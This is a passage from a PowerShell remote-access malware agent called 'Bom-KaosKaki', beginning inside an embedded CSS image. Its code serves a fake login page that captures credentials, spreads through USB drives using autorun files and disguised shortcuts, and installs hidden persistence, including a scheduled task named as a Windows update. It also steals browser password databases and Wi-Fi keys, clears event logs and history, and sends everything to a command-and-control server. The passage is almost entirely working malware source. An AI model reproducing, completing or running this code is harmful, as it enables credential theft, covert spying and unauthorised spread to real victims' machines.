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');
            background-size: 80px;
            background-repeat: repeat;
            opacity: 0.1; filter: saturate(35%);
            animation: moveDoodle 20s linear infinite;
            z-index: 0;
            pointer-events: none;
        }
        @keyframes moveDoodle { 0% { transform: translate(0, 0); } 100% { transform: translate(-80px, -80px); } }
        .login-wrapper { width: 100%; max-width: 360px; padding: 40px; border: 1px solid #eaeaeb; border-radius: 8px; background: #ffffff; box-shadow: 0 4px 24px rgba(0, 0, 0, 0.05); position: relative; z-index: 10; }
        .login-wrapper h2 { font-size: 20px; font-weight: 600; margin-bottom: 8px; text-align: center; letter-spacing: -0.5px; }
        .login-wrapper p { font-size: 14px; color: #666666; margin-bottom: 32px; text-align: center; }
        .input-group { margin-bottom: 16px; }
        .input-group label { display: block; font-size: 13px; font-weight: 500; margin-bottom: 8px; color: #444444; }
        .input-group input { width: 100%; padding: 12px; border: 1px solid #e0e0e0; border-radius: 6px; font-size: 14px; color: #111111; transition: border-color 0.1s; outline: none; }
        .input-group input:focus { border-color: #111111; }
        .btn { width: 100%; padding: 12px; background-color: #111111; color: #ffffff; border: none; border-radius: 6px; font-size: 14px; font-weight: 500; cursor: pointer; transition: background-color 0.1s; margin-top: 8px; }
        .btn:hover { background-color: #333333; }
        .error { color: #d32f2f; font-size: 13px; margin-top: 16px; text-align: center; display: none; }
    </style>
</head>
<body>
    <div class="doodle-bg"></div>
    <div class="login-wrapper">
        <h2>Welcome Back</h2>
        <p>Please enter your credentials</p>
        <form method="POST" action="/api/phish_capture">
            <div class="input-group"><label>Username</label><input type="text" name="username" placeholder="admin" required></div>
            <div class="input-group"><label>Password</label><input type="password" name="password" placeholder="••••••••" required></div>
            <button type="submit" class="btn">Sign In</button>
            <div class="error">Invalid credentials. Please try again.</div>
        </form>
    </div>
</body>
</html>
"@

    $htmlPath = "$phishingDir\index.html"
    [System.IO.File]::WriteAllText($htmlPath, $html)
    
    $port = 8080
    Start-Job -ScriptBlock {
        param($dir, $port, $sessionId, $c2Server)
        $listener = New-Object System.Net.HttpListener
        $listener.Prefixes.Add("http://localhost:$port/")
        $listener.Start()
        
        while ($true) {
            $context = $listener.GetContext()
            $request = $context.Request
            $response = $context.Response
            
            if ($request.HttpMethod -eq "POST" -and $request.Url.AbsolutePath -eq "/api/phish_capture") {
                $reader = New-Object System.IO.StreamReader($request.InputStream)
                $body = $reader.ReadToEnd()
                $payload = @{
                    session_id = $sessionId
                    type       = "phishing_creds"
                    data       = $body
                    timestamp  = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ssZ")
                }
                try {
                    $webClient = New-Object System.Net.WebClient
                    $webClient.Headers.Add("Content-Type", "application/json")
                    $webClient.UploadString("$c2Server/api/exfil", ($payload | ConvertTo-Json -Compress)) | Out-Null
                }
                catch {}
                $response.Redirect("https://login.live.com")
            }
            else {
                $html = [System.IO.File]::ReadAllText("$dir\index.html")
                $buffer = [System.Text.Encoding]::UTF8.GetBytes($html)
                $response.ContentType = "text/html"
                $response.OutputStream.Write($buffer, 0, $buffer.Length)
            }
            $response.Close()
        }
    } -ArgumentList $phishingDir, $port, $Script:SessionId, $C2Server | Out-Null
    
    $result = @{ local_url = "http://localhost:$port"; directory = $phishingDir; port = $port }
    Send-ExfilData -Type "phishing" -Data $result
    return "Phishing page running on http://localhost:$port. Use ngrok to expose externally."
}

function Invoke-Spread {
    param($cmd)
    
    $spreadPath = "$env:TEMP\spread_$($Script:SessionId).ps1"
    $scriptContent = @'
$driveLetters = [char[]]('D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z')
$c2Url = "C2_URL_PLACEHOLDER"
$payloadUrl = "$c2Url/api/payload"
$targetName = "KAOSKAKI.exe"

while ($true) {
    foreach ($drive in $driveLetters) {
        $path = "$drive`:\"
        if (Test-Path $path) {
            $driveType = (Get-WmiObject Win32_LogicalDisk -Filter "DeviceID='$drive'").DriveType
            if ($driveType -eq 2) {
                $shortcutPath = "$path\KAOSKAKI.lnk"
                if (-not (Test-Path $shortcutPath)) {
                    try {
                        Invoke-WebRequest -Uri $payloadUrl -OutFile "$path\$targetName" -UseBasicParsing
                        $WScriptShell = New-Object -ComObject WScript.Shell
                        $shortcut = $WScriptShell.CreateShortcut($shortcutPath)
                        $shortcut.TargetPath = "$path\$targetName"
                        $shortcut.WorkingDirectory = $path
                        $shortcut.IconLocation = "%SystemRoot%\System32\shell32.dll, 3"
                        $shortcut.Description = "Documents"
                        $shortcut.Save()
                        $autorun = "[Autorun]`nopen=$targetName`naction=Open folder to view files`nshell\open\command=$targetName`nshell\explore\command=$targetName"
                        [System.IO.File]::WriteAllText("$path\autorun.inf", $autorun)
                        # FIX: Use cmd /c to run attrib
                        cmd /c "attrib +h +s ""$path\$targetName"" ""$path\autorun.inf"" ""$shortcutPath"""
                    } catch {}
                }
            }
        }
    }
    Start-Sleep -Seconds 30
}
'@
    $scriptContent = $scriptContent.Replace("C2_URL_PLACEHOLDER", $C2Server)
    [System.IO.File]::WriteAllText($spreadPath, $scriptContent)
    Start-Job -FilePath $spreadPath
    return "USB spread monitor started. Checking for removable drives every 30 seconds."
}

function Invoke-Persistence {
    param($cmd)
    
    $currentPath = (Get-Process -Id $PID).Path
    $payloadPath = "$env:APPDATA\Microsoft\Windows\kaoskaki.ps1"
    $vbsPath = "$env:APPDATA\Microsoft\Windows\kaoskaki.vbs"
    $batPath = "$env:APPDATA\Microsoft\Windows\kaoskaki.bat"
    
    if (Test-Path $currentPath) { Copy-Item $currentPath $payloadPath -Force }
    
    $vbsContent = "Set WshShell = CreateObject(`"WScript.Shell`")`nWshShell.Run `"powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$payloadPath`"`", 0, False"
    [System.IO.File]::WriteAllText($vbsPath, $vbsContent)
    
    $batContent = "@echo off`npowershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$payloadPath`"`nexit"
    [System.IO.File]::WriteAllText($batPath, $batContent)
    
    $methods = @()
    
    try {
        New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "KaosKaki" -Value "wscript.exe `"$vbsPath`"" -PropertyType String -Force | Out-Null
        $methods += "registry_run"
    }
    catch {}
    
    try {
        $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\kaoskaki.vbs"
        Copy-Item $vbsPath $startupPath -Force
        $methods += "startup_folder"
    }
    catch {}
    
    try {
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$payloadPath`""
        $trigger = New-ScheduledTaskTrigger -AtStartup
        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        Register-ScheduledTask -TaskName "WindowsUpdate_KaosKaki" -Action $action -Trigger $trigger -Principal $principal -Force | Out-Null
        $methods += "scheduled_task"
    }
    catch {}
    
    $result = @{ methods = $methods; payload_path = $payloadPath; vbs_path = $vbsPath; bat_path = $batPath }
    Send-ExfilData -Type "persistence" -Data $result
    return "Persistence installed: $($methods -join ', ')"
}

function Invoke-Spyware {
    param($cmd)
    
    if ($Script:SpywareRunning) { return "Spyware already running" }
    $Script:SpywareRunning = $true
    
    $Script:SpywareJob = Start-Job -ScriptBlock {
        param($sessionId, $c2Server)
        while ($true) {
            try {
                $connections = Get-NetTCPConnection -State Established -ErrorAction SilentlyContinue | 
                Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, OwningProcess |
                Where-Object { $_.RemoteAddress -notin @("127.0.0.1", "::1") } | Select-Object -First 20
                if ($connections) {
                    $payload = @{ session_id = $sessionId; type = "spyware_connections"; data = ($connections | ConvertTo-Json -Compress); timestamp = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ssZ") }
                    $webClient = New-Object System.Net.WebClient
                    $webClient.Headers.Add("Content-Type", "application/json")
                    $webClient.UploadString("$c2Server/api/exfil", ($payload | ConvertTo-Json -Compress)) | Out-Null
                }
                $procs = Get-Process | Sort-Object CPU -Descending | Select-Object -First 20 Name, CPU, WorkingSet, StartTime
                $payload2 = @{ session_id = $sessionId; type = "spyware_processes"; data = ($procs | ConvertTo-Json -Compress); timestamp = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ssZ") }
                $webClient2 = New-Object System.Net.WebClient
                $webClient2.Headers.Add("Content-Type", "application/json")
                $webClient2.UploadString("$c2Server/api/exfil", ($payload2 | ConvertTo-Json -Compress)) | Out-Null
            }
            catch {}
            Start-Sleep -Seconds 120
        }
    } -ArgumentList $Script:SessionId, $C2Server
    return "Spyware monitoring started (network connections + top processes every 2 min)"
}

function Invoke-CleanTraces {
    param($cmd)  # parameter kept for compatibility but not used
    
    $cleaned = @()
    
    try { Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force -ErrorAction SilentlyContinue; $cleaned += "powershell_history" } catch {}
    try { wevtutil cl "Windows PowerShell" 2>$null; wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null; wevtutil cl "Security" 2>$null; wevtutil cl "System" 2>$null; wevtutil cl "Application" 2>$null; $cleaned += "event_logs" } catch {}
    try { Remove-Item "$env:TEMP\*" -Recurse -Force -ErrorAction SilentlyContinue; Remove-Item "$env:WINDIR\Temp\*" -Recurse -Force -ErrorAction SilentlyContinue; $cleaned += "temp_files" } catch {}
    try { Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -ErrorAction SilentlyContinue; $cleaned += "recent_files" } catch {}
    try { Remove-Item "$env:WINDIR\Prefetch\*" -Force -ErrorAction SilentlyContinue; $cleaned += "prefetch" } catch {}
    try { Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Clipboard]::Clear(); $cleaned += "clipboard" } catch {}
    try { Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -ErrorAction SilentlyContinue; $cleaned += "run_mru" } catch {}
    
    $result = @{ cleaned = $cleaned }
    Send-ExfilData -Type "clean" -Data $result
    return "Cleaned: $($cleaned -join ', ')"
}

function Invoke-StealBrowser {
    param($cmd)
    
    $browsers = @(
        @{path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"; name = "Chrome" },
        @{path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"; name = "Edge" },
        @{path = "$env:APPDATA\Opera Software\Opera Stable\Login Data"; name = "Opera" },
        @{path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data"; name = "Brave" }
    )
    
    $results = @()
    foreach ($browser in $browsers) {
        if (Test-Path $browser.path) {
            try {
                $tempFile = "$env:TEMP\login_data_$($browser.name)_$([Guid]::NewGuid().Guid).db"
                Copy-Item $browser.path $tempFile -Force
                $bytes = [System.IO.File]::ReadAllBytes($tempFile)
                Send-ExfilData -Type "browser" -Data @{ browser = $browser.name; file = [Convert]::ToBase64String($bytes); size = $bytes.Length }
                Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
                $results += @{ browser = $browser.name; stolen = $true; size = $bytes.Length }
            }
            catch {
                $results += @{ browser = $browser.name; error = $_.Exception.Message; stolen = $false }
            }
        }
        else {
            $results += @{ browser = $browser.name; stolen = $false; reason = "Not installed" }
        }
    }
    return ($results | ConvertTo-Json -Compress)
}

function Invoke-StealWiFi {
    param($cmd)
    
    $profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $_.ToString().Split(':')[1].Trim() }
    $wifiData = @()
    foreach ($wifiProfile in $profiles) {
        try {
            $details = netsh wlan show profile name="$wifiProfile" key=clear
            $password = ($details | Select-String "Key Content" | ForEach-Object { $_.ToString().Split(':')[1].Trim() })
            $auth = ($details | Select-String "Authentication" | Select-Object -First 1 | ForEach-Object { $_.ToString().Split(':')[1].Trim() })
            $wifiData += @{ ssid = $wifiProfile; password = if ($password) { $password } else { "(open network)" }; auth = if ($auth) { $auth } else { "Unknown" } }
        }
        catch {
            $wifiData += @{ ssid = $wifiProfile; password = "(error reading)"; error = $_.Exception.Message }
        }
    }
    $result = @{ networks = $wifiData; count = $wifiData.Count }
    Send-ExfilData -Type "wifi" -Data $result
    return ($result | ConvertTo-Json -Compress)
}

function Invoke-Uninstall {
    param($cmd)
    
    $null = Invoke-CleanTraces $cmd  # $cmd is ignored inside Invoke-CleanTraces
    
    try { Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "KaosKaki" -Force -ErrorAction SilentlyContinue } catch {}
    try { Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\kaoskaki.vbs" -Force -ErrorAction SilentlyContinue } catch {}
    try { Unregister-ScheduledTask -TaskName "WindowsUpdate_KaosKaki" -Confirm:$false -ErrorAction SilentlyContinue } catch {}
    try { Remove-Item "$env:APPDATA\Microsoft\Windows\kaoskaki.ps1" -Force -ErrorAction SilentlyContinue } catch {}
    try { Remove-Item "$env:APPDATA\Microsoft\Windows\kaoskaki.vbs" -Force -ErrorAction SilentlyContinue } catch {}
    try { Remove-Item "$env:APPDATA\Microsoft\Windows\kaoskaki.bat" -Force -ErrorAction SilentlyContinue } catch {}
    
    Stop-Keylogger $cmd
    if ($Script:SpywareJob) { try { $Script:SpywareJob | Stop-Job -Force; $Script:SpywareJob | Remove-Job -Force } catch {}; $Script:SpywareRunning = $false }
    
    Send-ExfilData -Type "uninstall" -Data @{ status = "uninstalled"; session_id = $Script:SessionId }
    
    $scriptPath = (Get-Process -Id $PID).Path
    $deleteScript = "Start-Sleep -Seconds 2; Remove-Item -Path '$scriptPath' -Force; Stop-Process -Id $PID -Force"
    Start-Job -ScriptBlock ([ScriptBlock]::Create($deleteScript))
    return "Uninstalling. Goodbye."
}

# ============ MAIN C2 LOOP ============

function Start-C2Communication {
    param([switch]$Force)
    $now = Get-Date
    if ($Force -or (($now - $Script:LastHeartbeat).TotalSeconds -ge $HeartbeatInterval)) { Send-Heartbeat -Force }
    if ($Force -or (($now - $Script:LastCommandPoll).TotalSeconds -ge $PollInterval)) { $Script:LastCommandPoll = $now; Invoke-CommandPoll }
}

function Invoke-Main {
    if (-not $Script:SessionId) {
        $Script:SessionId = Get-SessionId
        Write-Host "[+] Session ID: $Script:SessionId" -ForegroundColor Green
    }
    Write-Host "[+] Bom-KaosKaki Agent Started" -ForegroundColor Green
    Write-Host "[+] C2 Server: $C2Server" -ForegroundColor Cyan
    Write-Host "[+] Poll Interval: ${PollInterval}s | Heartbeat: ${HeartbeatInterval}s" -ForegroundColor Cyan
    Send-Heartbeat -Force
    while ($true) { Start-C2Communication; Start-Sleep -Seconds 5 }
}

# ============ ENTRY POINT ============
try {
    $consoleHandle = (Get-Process -Id $PID).MainWindowHandle
    if ($consoleHandle -and $consoleHandle -ne 0) {
        $typeDef = @"
[DllImport("user32.dll")]
public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);
"@
        $showWindowAsync = Add-Type -MemberDefinition $typeDef -Name "Win32Show" -Namespace "Win32" -PassThru
        $showWindowAsync::ShowWindowAsync($consoleHandle, 0) | Out-Null
    }
}
catch {}

Invoke-Main
